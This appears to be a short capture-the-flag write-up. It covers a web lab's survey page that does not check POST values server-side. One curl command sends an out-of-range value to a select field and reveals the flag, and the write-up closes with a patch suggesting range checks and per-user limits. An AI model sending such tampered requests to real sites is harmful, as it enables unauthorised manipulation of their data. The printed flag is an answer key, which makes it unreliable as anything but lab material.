# Exploit
We visit the url "/index.php?page=survey". We check if there is a verification for POST values, for example "42" for one of the select field.

```bash
curl 'http://x.x.x.x/index.php?page=survey#' --data 'sujet=2&valeur=42' | grep 'flag is'
```

No verification, we get the flag **03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa**

# Patch
Verify if the value is in the good range in the server side, authorize feedback once per IP address or logged account.